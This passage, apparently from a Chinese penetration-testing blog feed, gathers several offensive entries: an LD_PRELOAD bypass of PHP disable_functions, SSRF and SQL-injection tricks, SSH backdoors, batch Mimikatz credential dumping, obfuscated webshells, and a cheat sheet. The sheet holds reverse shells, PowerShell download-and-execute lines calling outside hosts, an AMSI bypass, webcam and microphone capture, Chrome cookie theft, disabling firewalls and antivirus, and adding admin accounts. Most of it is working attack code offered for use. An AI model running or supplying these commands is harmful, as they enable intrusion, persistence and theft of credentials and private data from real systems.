的限制，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 原理解读LD_PRELOAD的作用LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtimelinker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的 我们要做的就是通过修改环境变量LD_PRELOAD，让php启动新的进程的时候加载我们设置好的函数，比如说system()这样一来，就可以做到bypass了，只要启用了新的进程就有机会加载我们在上一个进程中构造的函数，通过测试可知mail可以创建新的进程，另外一个问题就是，如何构造我们想执行的函数，比如system() attribute((constructor))GCC 有个 C 语言扩展修饰符 attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute((constructor)) 修饰的函数。 因此，可以通过这个方式来构造函数，把我们要执行的命令放在环境变量里，执行时直接加载环境变量的命令，就可以做到绕过了 代码类似这种#define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; __attribute__ ((__constructor__)) void preloadme (void) { unsetenv(&quot;LD_PRELOAD&quot;); const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); system(cmdline); }工具使用https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 复现gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc2.so 然后写利用如下php &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path); ?&gt;然后访问http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so参考链接https://www.freebuf.com/articles/web/192052.html https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD来源:https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Php特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SSRF中的绕过姿势]]></title>
    <url>%2Farchives%2Fc0cf419.html</url>
    <content type="text"><![CDATA[从以下URL关键字中寻找SSRF漏洞： share wap url link src source target u 3g display sourceURl imageURL domain ...http://127.0.0.1/ 被过滤的时候，可以尝试一下几种方式： 1、@ http://abc@127.0.0.12、添加端口号 http://127.0.0.1:80803、短地址 http://dwz.cn/11SMa4、可以指向任意ip的域名：xip.io 10.0.0.1.xip.io 10.0.0.1 www.10.0.0.1.xip.io 10.0.0.1 mysite.10.0.0.1.xip.io 10.0.0.1 foo.bar.10.0.0.1.xip.io 10.0.0.15、ip地址转换成进制来访问 115.239.210.26 ＝ 16373751032首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制！访问使用http://00+转换后十六进制 115.239.210.26 = 0x73.0xef.0xd2.0x1a八进制 115.239.210.26 = 0163.0357.0322.0032]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[不知道列名的情况下注入]]></title>
    <url>%2Farchives%2Fa90cd968.html</url>
    <content type="text"><![CDATA[0x00 简介mysql版本,低于5.4的除了堆叠,别的就写不了了在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？ 在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。0x01 不使用表名查询正常的查询如下： 其中，列名为id,name,pass,mail,phone，使用union查询 select 1,2,3,4,5 union select * from users; 接着，就可以继续使用数字来对应列,如3对应了表里面的pass: select `3` from (select 1,2,3,4,5 union select * from users)a; 当 ` 不能使用的时候，使用别名来代替： select b from (select 1,2,3 as b,4,5 union select * from users)a; 在注入中查询多个列： select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select * from users)a limit 1,1; 原文: 不知列名的情况下注入]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>数据库特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透过程中的SSH(后门建立)]]></title>
    <url>%2Farchives%2F21b719d6.html</url>
    <content type="text"><![CDATA[1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。 2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接在肉鸡上执行： [root@localhost ~]# cd /usr/sbin [root@localhost sbin]# mv sshd ../bin [root@localhost sbin]# echo &apos;#!/usr/bin/perl&apos; &gt;sshd [root@localhost sbin]# echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd [root@localhost sbin]# echo &apos;exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd [root@localhost sbin]# chmod u+x sshd [root@localhost sbin]# /etc/init.d/sshd restart 在本机执行： socat STDIO TCP4:10.18.180.20:22,sourceport=13377 如果你想修改源端口，可以用python的struct标准库实现 &gt;&gt;&gt; import struct &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,19526) &gt;&gt;&gt; print repr(buffer) &apos;\x00\x00LF&apos; &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,13377) &gt;&gt;&gt; print buffer 记录SSH客户端连接密码搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。在肉鸡上修改要记录密码用户目录的.bashrc，添加一行: alias ssh=&apos;strace -o /tmp/.sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read.write.connect -s 2048 ssh&apos; 之后查看tmp目录的记录： grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>权限维持</category>
        <category>Linux权限维持</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[域渗透中找DC]]></title>
    <url>%2Farchives%2Fbd98337b.html</url>
    <content type="text"><![CDATA[1.net view net view /domain2.set log set log3.通过srv记录 nslookup -type=SRV _ldap._tcp.corp4.使用nltest nltest /dclist:corp5.使用dsquery DsQuery Server -domain corp6.使用netdom netdom query pdc这些都是win系统自带的命令，有的时候win版本不同，有的命令会不存在，所以多一种方法，多一种成功的可能性，实际渗透，自行根据目标环境变换]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用Invoke-Mimikatz.ps1批量获取windows密码]]></title>
    <url>%2Farchives%2Fed9d09ca.html</url>
    <content type="text"><![CDATA[通常可以使用以下方式获取登陆windows的密码：powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://dwz.cn/1OropX&apos;); Invoke-Mimikatz -DumpCreds&quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntds.dit的hash以后还不一定能破解出来,所以可以通过Mimikatz来获取明文密码，但是一台一台登陆去获取会很慢且不方便，所以这里介绍一个批量的方法： 1.创建共享文件夹： cd\ mkdir open net share open=C:\open /grant:everyone,full icacls C:\open\ /grant Everyone:(OI)(CI)F /t 修改注册表 reg change HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ open reg change HKLM\System\CurrentControlSet\Control\Lsa &quot;EveryoneIncludesAnonymous&quot; 1 修改共享目录到open。 2.在共享目录添加下列文件： 1）执行脚本powershellme.cmd，脚本内容： powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.1.11:8080/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.11\open\%COMPUTERNAME%.txt 2&gt;&amp;1 ip是设置共享的主机ip地址。 2）Invoke-Mimikatz.ps1 3）mongoose 4）服务器列表serverlist.txt，换行分割。 3.运行mongoose，默认开启端口8080 4.执行wmic： wmic /node:@serverlist.txt process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot;带凭证： wmic /node:@serverlist.txt /user:PROJECTMENTOR\evi1cg /password:123 process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot; 5.在共享目录看各个服务器的密码吧。 6.清除记录： 1）关掉mongoose,并删除 2）net share open /delete 3）删除共享目录及文件 4）修改注册表 PS:可以使用如下命令开启PowerShell remoting： psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe &quot;enable-psremotw]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>提权(系统级)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「木马变形」一句话木马的各种变形]]></title>
    <url>%2Farchives%2F54ea983c.html</url>
    <content type="text"><![CDATA[0x00:简介 一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。一句话木马一直在跟杀软斗智斗勇，出现一种，杀软秒更新规则。木马再变形，再被杀。。。出现0x01:叙事 一、常见的一句话例子： **ASP:&lt;%eval request(&quot;pass&quot;)%&gt; ASPX:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;z&quot;],&quot;unsafe&quot;));%&gt; PHP:&lt;?php eval(@$_POST[&apos;a&apos;]); ?&gt; JSP:&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;//无回显示执行系统命令**二、简单变形**ASP:&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;//-7 ASPX:&lt;%@ Page Language = Jscript %&gt; &lt;%var/*-/*-*/P/*-/*-*/=/*-/*-*/&quot;e&quot;+&quot;v&quot;+/*-/*-*/ &quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/*-/*-*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*-/*-*/+&quot;s&quot;+&quot;t&quot;+ &quot;[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]&quot;+ &quot;,&quot;+&quot;\&quot;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;\&quot;&quot;+&quot;)&quot;;eval (/*-/*-*/P/*-/*-*/,/*-/*-*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/*-/*-*/);%&gt;//-7 PHP:&lt;?php $_GET[a]($_GET[b]);?&gt; JSP:&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;**三、二次变形ASP:&lt;%if request (&quot;MH&quot;)&lt;&gt;&quot;&quot;then session(&quot;MH&quot;)=request(&quot;MH&quot;):end if:if session(&quot;MH&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;MH&quot;)%&gt; ASPX:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(String.Format(&quot;{0:yyyyMMdd}&quot;,DateTime.Now.ToUniversalTime())+&quot;37E4DD20C310142564FC483DB1132F36&quot;, &quot;MD5&quot;).ToUpper()],&quot;unsafe&quot;);%&gt;//随日期变化的连接密码 PHP:&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;JSP：&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt; 三次变形ASP:&lt;%@Page Language=&quot;C#&quot; %&gt;&lt;%@Import namespace=&quot;System.Reflection&quot;%&gt;&lt;%if (Request[&quot;pass&quot;]!=null){ Session.Add(&quot;k&quot;, Guid.NewGuid().ToString().Replace(&quot;-&quot;, &quot;&quot;).Substring(16)); Response.Write(Session[0]); return;}byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;//蚁剑中的一句话 PHP:&lt;?php session_start();isset($_GET[&apos;pass&apos;])?print $_SESSION[&apos;k&apos;]=substr(md5(uniqid(rand())),16):($b=explode(&apos;|&apos;,openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $_SESSION[&apos;k&apos;])))&amp;call_user_func($b[0],$b[1]);?&gt;//蚁剑中的一句话 JSP:&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null){String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;}Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;//蚁剑中的一句话四次变形 1、利用随机异或无限免杀d盾蚁剑版： 项目地址：https://github.com/yzddmr6/as_webshell_venom 2、利用动态二进制加密实现新型一句话木马： 文章地址：https://xz.aliyun.com/t/2799 第N次变形。。。。。 0x02:后话 一句话木马变形有很多种方式，文中举例只是其中几种方式。千奇百怪的变形，不断的变化，都是为了躲避杀软的检测。杀软也在不断的更新规则库。两者都是在博弈中不断的强大。 请勿非法利用 来源:微信公众号]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Commands 搜集(持续更新)]]></title>
    <url>%2Farchives%2F7eaedcae.html</url>
    <content type="text"><![CDATA[Linux Linux反弹shell后，方便的交互：python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;无python时：expect -c &apos;spawn bash;interact&apos;无wget nc等下载工具时下载文件exec 5&lt;&gt;/dev/tcp/sec-lab.org/80 &amp;&amp;echo -e “GET /c.pl HTTP/1.0\n” &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl修改上传文件时间戳(掩盖入侵痕迹) touch -r 老文件时间戳 新文件时间戳利用BASH提权 这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户$PROMPT_COMMAND 利用这个变量保存了在主提示符$PS1显示之前需要执行的命令导入: export PROMPT_COMMAND=”/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND”lsof 命令lsof 1.txt 显示开启文件 abc.txt 的进程 lsof -i :22 知道 22 端口现在运行什么程序 lsof -c nsd 显示 nsd 进程现在打开的文件 lsof -g gid 显示归属 gid 的进程情况 lsof +d /usr/local/ 显示目录下被进程开启的文件 lsof +D /usr/local/ 同上，但是会搜索目录下的目录，时间较长 lsof -d 4 显示使用 fd 为4 的进程 lsof -i [i] 用以显示符合条件的进程情况SSH端口转发下面文章详细描述了3种方式转发 http://www.cnblogs.com/david-zhang-index/archive/2012/08/18/2645943.html图片马Exiftool “-comment&lt;=raj.php” 1.pngWindowsPowershell 相关 获取无线密码：powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1&apos;);Get-Wlan-Keys &quot;提权加账号powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user evi1cg test123 /add&apos;&quot;下载执行：powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&apos;http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg&apos;,&apos;C:\\Users\Public\\test.jpg&apos;) &amp; start C:\\Users\\Public\\test.jpg摄像头录像：powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1&apos;); Capture-MiniEye -RecordTime 2 -Path $env:temp\hack.avi&quot;录音:powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&apos;);Get-MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias &apos;SECRET&apos;&quot; MSHTA VBSCRIPT EXEC mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close) JAVASCRIPT EXEC mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);} JSRAT mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);} Bypass AMSI: PS C:\&gt; [Ref].Assembly.GetType(&apos;System.Management.Automation.AmsiUtils&apos;).GetField(&apos;amsiInitFailed&apos;,&apos;NonPublic,Static&apos;).SetValue($null,$true) use: powershell.exe -ExecutionPolicy Bypass -noprofile [Ref].Assembly.GetType(&apos;&apos;System.Management.Automation.AmsiUtils&apos;&apos;).GetField(&apos;&apos;amsiInitFailed&apos;&apos;,&apos;&apos;NonPublic,Static&apos;&apos;).SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString(&apos;&apos;http://192.168.230.1/msfpayload.ps1&apos;&apos;) Bypass AV sqlite3.exe -cmd &quot;select load_extension(&apos;1.txt&apos;,&apos;EP&apos;)&quot; sqlite3.exe -cmd &quot;select load_extension(&apos;\\192.168.1.101\share\1.txt&apos;,&apos;EP&apos;)&quot;mimikatz 获取vpn密码mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit读取chrome cookiesmimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exit mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1&quot; exit mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit提权常用// What system are we connected to? systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;// Get the hostname and username (if available) hostname echo %username%// Get users net users net user [username]// Networking stuff ipconfig /all// Printer? route print// ARP-arific arp -A// Active network connections netstat -ano// Firewall fun (Win XP SP2+ only) netsh firewall show state netsh firewall show config// Scheduled tasks schtasks /query /fo LIST /v// Running processes to started services tasklist /SVC net start// Driver madness DRIVERQUERY// WMIC fun (Win 7/8 – XP requires admin) wmic /?//Use wmic_info script! // WMIC: check patch level wmic qfe get Caption,Description,HotFixID,InstalledOn// Search pathces for given patch wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot;// AlwaysInstallElevated fun reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated// Other commands to run to hopefully get what we need dir /s *pass* == *cred* == *vnc* == *.config* findstr /si password *.xml *.ini *.txt reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s// Service permissions sc query sc qc [service_name]// Accesschk stuff download link accesschk.exe /accepteula (always do this first!!!!!) accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!) accesschk.exe -uwcqv &quot;Authenticated Users&quot; * (won&apos;t yield anything on Win 8) accesschk.exe -ucqv [service_name]// Find all weak folder permissions per drive. accesschk.exe -uwdqs Users c:\ accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\// Find all weak file permissions per drive. accesschk.exe -uwqs Users c:\*.* accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*// Binary planting sc config [service_name] binpath= &quot;C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe&quot; sc config [service_name] obj= &quot;.\LocalSystem&quot; password= &quot;&quot; sc qc [service_name] (to verify!) net start [service_name] CMD %ProgramData:~0,1%%ProgramData:~9,2% /c echo命令行下载certutil -urlcache -split -f example.com/file命令行下连接VPN(win):rasdial &quot;VPN Connection&quot; zhaodg oZ7iFk25命令行关闭VPN连接(win):rasphone -h &quot;VPN Connection&quot;通过pptpsetup(Linux):pptpsetup --create vpn --server 5x.xxx.xxx.xx2 --username zhaodg --password oZ7iFk25 --encrypt --start注册表运行程序(用来整蛊挺好玩):reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d &quot;cmd.exe /c cmd.exe&quot; /f &amp;&amp; reg add HKCU\Software\Classes\Folder\shell\open\command /v &quot;DelegateExecute&quot; /f 删除命令:reg delete &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /fWindows Server 2019开启远程桌面 默认情况下，Windows Server 2019将外部远程桌面访问设置为禁用作为安全措施，我们可以轻松地从PowerShell中启用它 使用PowerShell允许远程桌面 我们可以使用Set-ItemPropery cmdlet修改启用或禁用远程桌面的注册表值： Set-ItemProperty -Path &apos;HKLM:\System\CurrentControlSet\Control\Terminal Server&apos; -name &quot;fDenyTSConnections&quot; -value 0 完成后，使用’Enable-NetFirewallRule’配置Windows防火墙以允许远程桌面连接：Enable-NetFirewallRule -DisplayGroup “Remote Desktop”默认情况下，这将允许所有连接建议尽可能配置更具体的防火墙规则 关闭防火墙: 关闭windows防火墙需要管理员或system权限 netsh advfirewall set allprofiles state off关闭windefebdnet stop windefend关闭DEPbcdedit.exe /set{current} nx AlwaysOffBitlocker磁盘加密manage-bde-off C: manage-bde-status C:端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe -s #运行程序，将3389转发到80 ANTIFW.exe -l #关闭程序，恢复cmd探查信息探测类systeminfo ：查看系统版本信息 netstat -ano : 查看系统开放端口 tasklist /svc : 查看系统进程 ipconfig : 查看ip地址 whoami : 查看当前用户 net user : 查看计算机用户列表 net localgroup : 查看计算机用户组列表添加用户类net user mstlab mstlab /add : 添加用户并设置密码 net localgroup administrators mstlab /add : 将用户加入管理组 net user guest /active:yes : 激活guest用户 net user guest mstlab : 更改guest用户的密码KIll DOG:Kill Dog：1.安全狗默认只拦截加管理组，不拦截加用户 法a：利用用户克隆exp：直接克隆administrator的权限 法b：反弹shell读取管理员密码 法c：改注册表替换安全狗的文件，然后重启服务器(redegit /s redegit.reg(redegit.reg见附录))安全狗关闭 2.安全狗账号防护最严程度：拦截添加用户 法a：激活guest，然后克隆用户 法b：反弹shell读取管理员密码 法c：改注册表，重启服务器，关闭安全狗 redegit.reg脚本内容：Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SafeDogGuardCenter.exe] &quot;Debugger&quot;=&quot;C:\WWW\l.php&quot;开启的3389方法：1.通用开3389(优化后)：wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 12.For Win2003:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f3.For Win2008:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f4.For Every:cmd开3389 win08 win03 win7 win2012 winxpwin08，三条命令即可:wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1 wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fwin2012通用；win7前两条即可。权限需要run as administrator查询终端端口 ：REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber (or) 终端端口：tasklist /svc查询TermService对应PID和netstat查询的PID对应的端口号 (or) 注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ Wds dpwd\Tds cp 中PortNumber的值数据库提权:UDF手工提权辅助：select @@basedir; #查看mysql安装目录 select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib::&apos;; #利用NTFS ADS创建lib目录 select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib\plugin::&apos;; #利用NTFS ADS创建plugin目录 select 0xUDFcode into dumpfile &apos;C:\phpstu\MySQL\lib\plugin\mstlab.dll&apos;; #导出udfcode，注意修改udfcode create function cmdshell returns string soname &apos;mstlab.dll&apos;; #用udf创建cmd函数，shell,sys_exec,sys_eval select shell(&apos;cmd&apos;,&apos;net user&apos;); #执行cmd命令show variables like ‘%plugin%’; #查看plugin路径 小技巧：1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中ImagePath的值为mysql安装目录 2.my.ini中datadir的值是数据存放目录 3.UPDATE user set File_priv =&apos;Y&apos;; flush privileges; 强制加file权限MOF手工提权辅助：pragma namespace(&quot;\\.\root\subscription&quot;) instance of __EventFilter as { EventNamespace = &quot;Root\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; }; instance of ActiveScriptEventConsumer as { Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;) WSH.run(\&quot;net.exe user admintony admin /add&amp;&amp;net.exe localgroup administrators admintony /add\&quot;)&quot;; }; instance of __FilterToConsumerBinding { Consumer = ; Filter = ; }; 保存为 1.mof 然后mysql执行：select load_file(&apos;D:/wwwroot/1.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;SA提权辅助：1.判断扩展存储是否存在：select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name= &apos;xp_cmdshell&apos; select count(*) from master.dbo.sysobjects where name=&apos;xp_regread&apos;恢复：exec sp_dropextendedproc 